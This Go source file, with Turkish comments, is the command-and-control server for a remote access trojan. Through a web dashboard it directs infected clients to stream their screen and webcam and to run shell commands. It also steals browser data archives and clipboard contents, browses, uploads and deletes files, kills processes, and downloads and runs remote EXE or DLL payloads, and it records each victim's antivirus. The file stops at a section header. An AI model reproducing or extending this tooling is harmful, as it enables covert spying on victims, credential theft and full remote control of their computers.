package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ─── TCP Listener (dinamik restart için) ──────────────────
var (
	tcpListener   net.Listener
	tcpListenerMu sync.Mutex
)

// ─── Config ───────────────────────────────────────────────
type Config struct {
	Key       string `json:"key"`
	HTTPPort  string `json:"http_port"`
	TCPPort   string `json:"tcp_port"`
	ScreenFPS int    `json:"screen_fps"`
}

var config Config

func loadConfig() {
	data, err := os.ReadFile("json/config.json")
	if err != nil {
		log.Fatal("config.json okunamadı:", err)
	}
	if err := json.Unmarshal(data, &config); err != nil {
		log.Fatal("config.json parse hatası:", err)
	}
}

func saveConfig() error {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile("json/config.json", data, 0644)
}

// ─── ID Üretici ───────────────────────────────────────────
const idChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func generateID() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	b := make([]byte, 8)
	for i := range b {
		b[i] = idChars[r.Intn(len(idChars))]
	}
	return string(b)
}

// ─── Shell Output Buffer ──────────────────────────────────
type OutputEntry struct {
	Kind string `json:"kind"`
	Data string `json:"data"`
	At   string `json:"at"`
}

// ─── Client Yönetimi ──────────────────────────────────────
const (
	HeartbeatInterval = 10 * time.Second
	HeartbeatTimeout  = 25 * time.Second
	MaxOutputHistory  = 200
)

type Client struct {
	ID          string
	IP          string
	ConnectedAt string
	conn        net.Conn
	lastPong    time.Time
	mu          sync.Mutex
	outputs     []OutputEntry
	// Sistem bilgisi
	WinVersion  string
	DesktopName string
	AntiVirus   string
	Country     string
	GPU         string
	CPU         string
	RAM         string
	Disk        string
	ProcessName string
	// Ekran
	LastFrame   string
	Screening   bool
	// Kamera
	LastCamFrame string
	Caming       bool
	// Task Manager
	LastTasklist   string
	TasklistReady  bool
	LastKillResult string
	// File Browser
	FBResult string
	FBReady  bool
	FBKind   string // hangi komutun sonucu: ls, download, delete, mkdir, upload, rename
	// Remote File Execution
	RFEResult string
	RFEReady  bool
	// Browser Data
	// Client'tan [browser_zip]<isim>|<base64> gelince decode edilip burada tutulur.
	// /api/browser/collect isteği gelince bytes doğrudan application/zip olarak tarayıcıya gönderilir.
	BrowserZipName  string // örn. "Edge_extract.zip"
	BrowserZipBytes []byte // zip binary
	BrowserErrMsg   string // extraction başarısız olursa hata mesajı
	BrowserReady    bool   // client cevap gönderdi mi
	// Clipboard Manager
	ClipboardResult    string
	ClipboardReady     bool
	ClipboardSetResult string
	ClipboardSetReady  bool
	// Settings
	Nickname string
	Note     string
}

func (c *Client) updatePong() {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.lastPong = time.Now()
}

func (c *Client) isAlive() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return time.Since(c.lastPong) < HeartbeatTimeout
}

func (c *Client) addOutput(kind, data string) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.outputs = append(c.outputs, OutputEntry{
		Kind: kind,
		Data: data,
		At:   time.Now().Format("15:04:05"),
	})
	if len(c.outputs) > MaxOutputHistory {
		c.outputs = c.outputs[len(c.outputs)-MaxOutputHistory:]
	}
}

func (c *Client) getOutputs() []OutputEntry {
	c.mu.Lock()
	defer c.mu.Unlock()
	cp := make([]OutputEntry, len(c.outputs))
	copy(cp, c.outputs)
	return cp
}

var (
	clients   []*Client
	clientsMu sync.Mutex
	startTime = time.Now()
)

func addClient(c *Client) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	clients = append(clients, c)
}

func removeClientByID(id string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for i, c := range clients {
		if c.ID == id {
			clients = append(clients[:i], clients[i+1:]...)
			return
		}
	}
}

func getClients() []map[string]string {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	list := make([]map[string]string, 0, len(clients))
	for _, c := range clients {
		c.mu.Lock()
		entry := map[string]string{
			"ID":          c.ID,
			"IP":          c.IP,
			"ConnectedAt": c.ConnectedAt,
			"WinVersion":  c.WinVersion,
			"DesktopName": c.DesktopName,
			"AntiVirus":   c.AntiVirus,
			"Country":     c.Country,
			"GPU":         c.GPU,
			"CPU":         c.CPU,
			"RAM":         c.RAM,
			"Disk":        c.Disk,
			"ProcessName": c.ProcessName,
			"Nickname":    c.Nickname,
			"Note":        c.Note,
		}
		c.mu.Unlock()
		list = append(list, entry)
	}
	return list
}

func getClientByID(id string) *Client {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for _, c := range clients {
		if c.ID == id {
			return c
		}
	}
	return nil
}

func sendCommandByID(id, cmd string) error {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for _, c := range clients {
		if c.ID == id {
			_, err := fmt.Fprintf(c.conn, cmd+"\n")
			return err
		}
	}
	return fmt.Errorf("client bulunamadı: %s", id)
}

func broadcast(cmd string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for _, c := range clients {
		fmt.Fprintf(c.conn, cmd+"\n")
	}
}

// ─── Server Stats ─────────────────────────────────────────
type Stats struct {
	ClientCount int    `json:"client_count"`
	Uptime      string `json:"uptime"`
	GoRoutines  int    `json:"goroutines"`
	MemAlloc    uint64 `json:"mem_alloc_mb"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	GoVersion   string `json:"go_version"`
	TCPPort     string `json:"tcp_port"`
	HTTPPort    string `json:"http_port"`
}

func getStats() Stats {
	var mem runtime.MemStats
	runtime.ReadMemStats(&mem)

	clientsMu.Lock()
	count := len(clients)
	clientsMu.Unlock()

	uptime := time.Since(startTime)
	h := int(uptime.Hours())
	m := int(uptime.Minutes()) % 60
	s := int(uptime.Seconds()) % 60
	uptimeStr := fmt.Sprintf("%02d:%02d:%02d", h, m, s)

	return Stats{
		ClientCount: count,
		Uptime:      uptimeStr,
		GoRoutines:  runtime.NumGoroutine(),
		MemAlloc:    mem.Alloc / 1024 / 1024,
		OS:          runtime.GOOS,
		Arch:        runtime.GOARCH,
		GoVersion:   runtime.Version(),
		TCPPort:     config.TCPPort,
		HTTPPort:    config.HTTPPort,
	}
}

// ─── TCP Server ───────────────────────────────────────────
func startTCPServer() {
	ln, err := net.Listen("tcp", ":"+config.TCPPort)
	if err != nil {
		log.Fatal("TCP server başlatılamadı:", err)
	}
	tcpListenerMu.Lock()
	tcpListener = ln
	tcpListenerMu.Unlock()
	log.Printf("TCP server başlatıldı → :%s", config.TCPPort)
	acceptLoop(ln)
}

func acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			// Listener kapatıldıysa (port değişimi) sessizce çık
			select {
			default:
				log.Println("TCP accept hatası:", err)
			}
			return
		}
		go handleTCPClient(conn)
	}
}

// Tüm bağlı clientlerin conn'larını kapatır ve listeyi temizler
func disconnectAllClients() {
	clientsMu.Lock()
	defer clientsMu.Unlock()
	for _, c := range clients {
		c.conn.Close()
	}
	clients = nil
}

// Mevcut listener'ı kapatır, tüm clientleri koparır, yeni portta yeniden başlatır
func restartTCPServer(newPort string) error {
	// Önce yeni portu dinlemeye çalış — başarısız olursa hiçbir şeyi bozma
	ln, err := net.Listen("tcp", ":"+newPort)
	if err != nil {
		return fmt.Errorf("TCP port %s dinlenemiyor: %w", newPort, err)
	}

	// Eski listener'ı kapat
	tcpListenerMu.Lock()
	old := tcpListener
	tcpListener = ln
	tcpListenerMu.Unlock()

	if old != nil {
		old.Close()
	}

	// Tüm mevcut bağlantıları kapat ve listeyi temizle
	disconnectAllClients()

	log.Printf("TCP server yeni portta başlatıldı → :%s", newPort)
	go acceptLoop(ln)
	return nil
}

func handleTCPClient(conn net.Conn) {
	id := generateID()
	ip := conn.RemoteAddr().String()
	log.Printf("[TCP] Bağlandı: %s (ID: %s)", ip, id)

	client := &Client{
		ID:          id,
		IP:          ip,
		ConnectedAt: time.Now().Format("02.01.2006 15:04:05"),
		conn:        conn,
		lastPong:    time.Now(),
	}
	addClient(client)

	defer func() {
		conn.Close()
		removeClientByID(id)
		log.Printf("[TCP] Ayrıldı: %s (ID: %s)", ip, id)
	}()

	go func() {
		ticker := time.NewTicker(HeartbeatInterval)
		defer ticker.Stop()
		for range ticker.C {
			if !client.isAlive() {
				log.Printf("[Heartbeat] %s (ID: %s) timeout", ip, id)
				conn.Close()
				return
			}
			if _, err := fmt.Fprintf(conn, "ping\n"); err != nil {
				return
			}
		}
	}()

	scanner := bufio.NewScanner(conn)
	// Büyük dosya transferleri için buffer boyutu:
	// filebrowser.rs MAX_DOWNLOAD_BYTES = 50MB → base64 encode → ~67MB tek satır
	// browser zip transferleri de büyük olabilir
	const maxScanBuf = 150 * 1024 * 1024 // Max line size: 150 MB
	// Use a small initial buffer (64KB) but allow it to grow up to maxScanBuf.
	// This prevents immediate pre-allocation of 150MB per client.
	scanner.Buffer(make([]byte, 64*1024), maxScanBuf)

	for scanner.Scan() {
		line := scanner.Text()
		switch {
		case line == "pong":
			client.updatePong()

		case strings.HasPrefix(line, "[ps_output]"):
			data := strings.TrimPrefix(line, "[ps_output]")
			client.addOutput("ps", data)

		case strings.HasPrefix(line, "[cmd_output]"):
			data := strings.TrimPrefix(line, "[cmd_output]")
			client.addOutput("cmd", data)

		case strings.HasPrefix(line, "[cam_frame]"):
			data := strings.TrimPrefix(line, "[cam_frame]")
			client.mu.Lock()
			client.LastCamFrame = data
			client.mu.Unlock()

		case strings.HasPrefix(line, "[screen_frame]"):
			data := strings.TrimPrefix(line, "[screen_frame]")
			client.mu.Lock()
			client.LastFrame = data
			client.mu.Unlock()

		case strings.HasPrefix(line, "[sysinfo]"):
			data := strings.TrimPrefix(line, "[sysinfo]")
			// Protokol: WinVersion|DesktopName|AntiVirus|Country|GPU|CPU|RAM|Disk|ProcessName
			parts := strings.Split(data, "|")
			client.mu.Lock()
			if len(parts) >= 1 { client.WinVersion  = parts[0] }
			if len(parts) >= 2 { client.DesktopName = parts[1] }
			if len(parts) >= 3 { client.AntiVirus   = parts[2] }
			if len(parts) >= 4 { client.Country     = parts[3] }
			if len(parts) >= 5 { client.GPU         = parts[4] }
			if len(parts) >= 6 { client.CPU         = parts[5] }
			if len(parts) >= 7 { client.RAM         = parts[6] }
			if len(parts) >= 8 { client.Disk        = parts[7] }
			if len(parts) >= 9 { client.ProcessName = parts[8] }
			client.mu.Unlock()
			log.Printf("[Sysinfo][%s] win=%s desktop=%s av=%s country=%s gpu=%s cpu=%s ram=%s disk=%s proc=%s",
				id, client.WinVersion, client.DesktopName, client.AntiVirus, client.Country,
				client.GPU, client.CPU, client.RAM, client.Disk, client.ProcessName)

		case strings.HasPrefix(line, "[tasklist_result]"):
			data := strings.TrimPrefix(line, "[tasklist_result]")
			client.mu.Lock()
			client.LastTasklist = data
			client.TasklistReady = true
			client.mu.Unlock()

		case strings.HasPrefix(line, "[taskkill_result]"):
			data := strings.TrimPrefix(line, "[taskkill_result]")
			client.mu.Lock()
			client.LastKillResult = data
			client.mu.Unlock()

		case strings.HasPrefix(line, "[rfe_result]"):
			data := strings.TrimPrefix(line, "[rfe_result]")
			client.mu.Lock()
			client.RFEResult = data
			client.RFEReady  = true
			client.mu.Unlock()

		// ── Browser zip transferi ──────────────────────────────────────────────
		// Protokol: [browser_zip]<zip_adi>|<base64_zip_bytes>
		// Örn:      [browser_zip]Edge_extract.zip|UEsDB...
		case strings.HasPrefix(line, "[browser_zip]"):
			payload := strings.TrimPrefix(line, "[browser_zip]")
			sep := strings.IndexByte(payload, '|')
			if sep < 0 {
				log.Printf("[Browser][%s] Geçersiz browser_zip formatı (| yok)", id)
				client.mu.Lock()
				client.BrowserErrMsg  = "geçersiz zip paketi formatı"
				client.BrowserReady   = true
				client.mu.Unlock()
				break
			}
			zipName := payload[:sep]
			b64Data := payload[sep+1:]
			zipBytes, err := base64.StdEncoding.DecodeString(b64Data)
			if err != nil {
				log.Printf("[Browser][%s] Base64 decode hatası: %v", id, err)
				client.mu.Lock()
				client.BrowserErrMsg  = "base64 decode hatası: " + err.Error()
				client.BrowserReady   = true
				client.mu.Unlock()
				break
			}
			log.Printf("[Browser][%s] Zip alındı: %s (%d bytes)", id, zipName, len(zipBytes))
			client.mu.Lock()
			client.BrowserZipName  = zipName
			client.BrowserZipBytes = zipBytes
			client.BrowserErrMsg   = ""
			client.BrowserReady    = true
			client.mu.Unlock()

		// ── Browser hata mesajı ───────────────────────────────────────────────
		case strings.HasPrefix(line, "[browser_zip_err]"):
			errMsg := strings.TrimPrefix(line, "[browser_zip_err]")
			log.Printf("[Browser][%s] Hata: %s", id, errMsg)
			client.mu.Lock()
			client.BrowserErrMsg   = errMsg
			client.BrowserZipBytes = nil
			client.BrowserZipName  = ""
			client.BrowserReady    = true
			client.mu.Unlock()

		case strings.HasPrefix(line, "[clipboard_result]"):
			data := strings.TrimPrefix(line, "[clipboard_result]")
			client.mu.Lock()
			client.ClipboardResult = data
			client.ClipboardReady  = true
			client.mu.Unlock()

		case strings.HasPrefix(line, "[clipboard_set_result]"):
			data := strings.TrimPrefix(line, "[clipboard_set_result]")
			client.mu.Lock()
			client.ClipboardSetResult = data
			client.ClipboardSetReady  = true
			client.mu.Unlock()

		case strings.HasPrefix(line, "[ls_result]"),
			strings.HasPrefix(line, "[download_result]"),
			strings.HasPrefix(line, "[delete_result]"),
			strings.HasPrefix(line, "[mkdir_result]"),
			strings.HasPrefix(line, "[upload_result]"),
			strings.HasPrefix(line, "[rename_result]"):
			// hangi prefix olduğunu bul
			var kind, data string
			for _, pfx := range []string{"[ls_result]","[download_result]","[delete_result]","[mkdir_result]","[upload_result]","[rename_result]"} {
				if strings.HasPrefix(line, pfx) {
					kind = strings.TrimPrefix(strings.TrimSuffix(pfx, "]"), "[")
					data = strings.TrimPrefix(line, pfx)
					break
				}
			}
			client.mu.Lock()
			client.FBResult = data
			client.FBKind   = kind
			client.FBReady  = true
			client.mu.Unlock()

		default:
			log.Printf("[TCP][%s][%s] → %s", id, ip, line)
		}
	}
}

// ─── Auth ─────────────────────────────────────────────────
func isAuthenticated(r *http.Request) bool {
	cookie, err := r.Cookie("session")
	if err != nil {
		return false
	}
	return cookie.Value == "authenticated"
}

// ─── HTTP Handlers ────────────────────────────────────────
func indexHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	tmpl, _ := template.ParseFiles("html/index.html")
	tmpl.Execute(w, nil)
}

func loginGetHandler(w http.ResponseWriter, r *http.Request) {
	if isAuthenticated(r) {
		http.Redirect(w, r, "/dashboard", http.StatusFound)
		return
	}
	tmpl, _ := template.ParseFiles("html/login.html")
	tmpl.Execute(w, nil)
}

func loginPostHandler(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	if r.FormValue("key") == config.Key {
		http.SetCookie(w, &http.Cookie{
			Name:     "session",
			Value:    "authenticated",
			Path:     "/",
			Expires:  time.Now().Add(24 * time.Hour),
			HttpOnly: true,
		})
		http.Redirect(w, r, "/dashboard", http.StatusFound)
		return
	}
	tmpl, _ := template.ParseFiles("html/login.html")
	tmpl.Execute(w, map[string]string{"Error": "Geçersiz key!"})
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Redirect(w, r, "/login", http.StatusFound)
		return
	}
	tmpl, _ := template.ParseFiles("html/dashboard.html")
	list := getClients()
	tmpl.Execute(w, map[string]interface{}{
		"Clients": list,
		"Count":   len(list),
	})
}

func apiClientsHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(getClients())
}

func apiSendHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID  string `json:"id"`
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	log.Printf("[API] Send → id=%s cmd=%s", req.ID, req.Cmd)
	if err := sendCommandByID(req.ID, req.Cmd); err != nil {
		log.Printf("[API] Send hata: %s", err)
		http.Error(w, err.Error(), 404)
		return
	}
	w.WriteHeader(200)
}

func apiBroadcastHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	broadcast(req.Cmd)
	w.WriteHeader(200)
}

func apiOutputHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	id := r.URL.Query().Get("id")
	client := getClientByID(id)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(client.getOutputs())
}

func apiStatsHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(getStats())
}

// GET /api/screen?id=X → son frame base64 JPEG
func apiScreenHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	id := r.URL.Query().Get("id")
	client := getClientByID(id)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	client.mu.Lock()
	frame := client.LastFrame
	client.mu.Unlock()
	if frame == "" {
		w.WriteHeader(204)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"frame": frame})
}

// POST /api/screen/ctrl  { "id":"...", "action":"start"|"stop" }
func apiScreenCtrlHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID     string `json:"id"`
		Action string `json:"action"`
		FPS    int    `json:"fps"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	fps := req.FPS
	if fps <= 0 { fps = config.ScreenFPS }
	if fps <= 0 { fps = 10 }
	var cmd string
	if req.Action == "start" {
		client.mu.Lock()
		client.Screening = true
		client.mu.Unlock()
		cmd = fmt.Sprintf("[screen_start]%d", fps)
	} else {
		client.mu.Lock()
		client.Screening = false
		client.LastFrame = ""
		client.mu.Unlock()
		cmd = "[screen_stop]"
	}
	if err := sendCommandByID(req.ID, cmd); err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	w.WriteHeader(200)
}

// GET /api/screen/status?id=X → screening aktif mi
func apiScreenStatusHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	id := r.URL.Query().Get("id")
	client := getClientByID(id)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	client.mu.Lock()
	screening := client.Screening
	client.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]bool{"screening": screening})
}


// GET /api/cam?id=X → son kamera frame
func apiCamHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	id := r.URL.Query().Get("id")
	client := getClientByID(id)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	client.mu.Lock()
	frame := client.LastCamFrame
	client.mu.Unlock()
	if frame == "" {
		w.WriteHeader(204)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"frame": frame})
}

// POST /api/cam/ctrl  { "id":"...", "action":"start"|"stop", "fps": N }
func apiCamCtrlHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID     string `json:"id"`
		Action string `json:"action"`
		FPS    int    `json:"fps"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	fps := req.FPS
	if fps <= 0 { fps = 10 }
	var cmd string
	if req.Action == "start" {
		client.mu.Lock()
		client.Caming = true
		client.mu.Unlock()
		cmd = fmt.Sprintf("[cam_start]%d", fps)
	} else {
		client.mu.Lock()
		client.Caming = false
		client.LastCamFrame = ""
		client.mu.Unlock()
		cmd = "[cam_stop]"
	}
	if err := sendCommandByID(req.ID, cmd); err != nil {
		http.Error(w, err.Error(), 404)
		return
	}
	w.WriteHeader(200)
}

// GET /api/cam/status?id=X
func apiCamStatusHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	id := r.URL.Query().Get("id")
	client := getClientByID(id)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	client.mu.Lock()
	caming := client.Caming
	client.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]bool{"caming": caming})
}

// POST /api/tasklist  { "id":"..." }
func apiTasklistHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }

	// GET ve POST her ikisini de destekle
	var id string
	if r.Method == http.MethodPost {
		var req struct { ID string `json:"id"` }
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", 400); return
		}
		id = req.ID
	} else {
		id = r.URL.Query().Get("id")
	}

	client := getClientByID(id)
	if client == nil { http.Error(w, "client bulunamadı", 404); return }

	client.mu.Lock()
	client.TasklistReady = false
	client.LastTasklist  = ""
	client.mu.Unlock()

	if err := sendCommandByID(id, "[tasklist]"); err != nil { http.Error(w, err.Error(), 500); return }

	deadline := time.Now().Add(15 * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready := client.TasklistReady
		data  := client.LastTasklist
		client.mu.Unlock()
		if ready {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, data)
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	http.Error(w, "timeout", 504)
}

// POST /api/taskkill  { "id":"...", "pid": <number> }
func apiTaskkillHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }

	// pid hem string hem int olarak gelebilir
	var raw struct {
		ID  string          `json:"id"`
		PID json.RawMessage `json:"pid"`
	}
	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
		http.Error(w, "bad request", 400); return
	}

	// pid'i string'e çevir (int ya da string olabilir)
	pidStr := strings.Trim(string(raw.PID), `"`)

	if err := sendCommandByID(raw.ID, fmt.Sprintf("[taskkill]%s", pidStr)); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]interface{}{"success": false, "message": err.Error()})
		return
	}

	// Client'tan [taskkill_result] gelmesini bekle
	client := getClientByID(raw.ID)
	if client == nil {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "komut gönderildi"})
		return
	}

	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		result := client.LastKillResult
		client.mu.Unlock()
		if result != "" {
			w.Header().Set("Content-Type", "application/json")
			success := strings.HasPrefix(result, "ok")
			msg := result
			if idx := strings.Index(result, ":"); idx >= 0 { msg = result[idx+1:] }
			json.NewEncoder(w).Encode(map[string]interface{}{"success": success, "message": strings.TrimSpace(msg)})
			// Sonucu sıfırla
			client.mu.Lock()
			client.LastKillResult = ""
			client.mu.Unlock()
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	// Timeout ama komut gönderildi, başarılı say
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"success": true, "message": "komut gönderildi"})
}

// ─── File Browser yardımcısı ──────────────────────────────
func fbRequest(w http.ResponseWriter, id, cmd, resultKind string, timeoutSec int) {
	client := getClientByID(id)
	if client == nil { http.Error(w, "client bulunamadı", 404); return }

	client.mu.Lock()
	client.FBReady  = false
	client.FBResult = ""
	client.FBKind   = ""
	client.mu.Unlock()

	if err := sendCommandByID(id, cmd); err != nil { http.Error(w, err.Error(), 500); return }

	deadline := time.Now().Add(time.Duration(timeoutSec) * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready := client.FBReady
		kind  := client.FBKind
		data  := client.FBResult
		client.mu.Unlock()
		if ready && kind == resultKind {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, data)
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	http.Error(w, "timeout", 504)
}

// POST /api/fb/ls  { "id":"...", "path":"..." }
func apiFBLsHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Path string `json:"path"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	fbRequest(w, req.ID, fmt.Sprintf("[ls]%s", req.Path), "ls_result", 10)
}

// POST /api/fb/download  { "id":"...", "path":"..." }
func apiFBDownloadHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Path string `json:"path"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	fbRequest(w, req.ID, fmt.Sprintf("[download]%s", req.Path), "download_result", 60)
}

// POST /api/fb/delete  { "id":"...", "path":"..." }
func apiFBDeleteHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Path string `json:"path"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	fbRequest(w, req.ID, fmt.Sprintf("[delete]%s", req.Path), "delete_result", 10)
}

// POST /api/fb/mkdir  { "id":"...", "path":"..." }
func apiFBMkdirHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Path string `json:"path"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	fbRequest(w, req.ID, fmt.Sprintf("[mkdir]%s", req.Path), "mkdir_result", 10)
}

// POST /api/fb/upload  { "id":"...", "path":"...", "data":"base64" }
func apiFBUploadHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Path string `json:"path"`; Data string `json:"data"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	payload := req.Path + "|" + req.Data
	fbRequest(w, req.ID, fmt.Sprintf("[upload]%s", payload), "upload_result", 30)
}

// POST /api/fb/rename  { "id":"...", "old":"...", "new":"..." }
func apiFBRenameHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) { http.Error(w, "Unauthorized", 401); return }
	var req struct { ID string `json:"id"`; Old string `json:"old"`; New string `json:"new"` }
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil { http.Error(w, "bad request", 400); return }
	payload := req.Old + "|" + req.New
	fbRequest(w, req.ID, fmt.Sprintf("[rename]%s", payload), "rename_result", 10)
}

// POST /api/rfe  { "id":"...", "url":"...", "type":"exe"|"dll", "args":"..." }
func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID   string `json:"id"`
		URL  string `json:"url"`
		Type string `json:"type"` // "exe" veya "dll"
		Args string `json:"args"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	if req.ID == "" || req.URL == "" {
		http.Error(w, "id ve url zorunlu", 400)
		return
	}
	if req.Type != "exe" && req.Type != "dll" {
		http.Error(w, "type 'exe' veya 'dll' olmalı", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}
	client.mu.Lock()
	client.RFEReady  = false
	client.RFEResult = ""
	client.mu.Unlock()

	// Komut formatı: [rfe_exe]url|args  veya  [rfe_dll]url
	var cmd string
	if req.Type == "exe" {
		cmd = fmt.Sprintf("[rfe_exe]%s|%s", req.URL, req.Args)
	} else {
		cmd = fmt.Sprintf("[rfe_dll]%s", req.URL)
	}

	if err := sendCommandByID(req.ID, cmd); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	// En fazla 30 saniye bekle
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready  := client.RFEReady
		result := client.RFEResult
		client.mu.Unlock()
		if ready {
			w.Header().Set("Content-Type", "application/json")
			success := strings.HasPrefix(result, "ok:")
			msg := result
			if idx := strings.Index(result, ":"); idx >= 0 {
				msg = result[idx+1:]
			}
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": success,
				"message": msg,
			})
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	http.Error(w, "timeout: client cevap vermedi", 504)
}

// ─── Browser Collect ──────────────────────────────────────
//
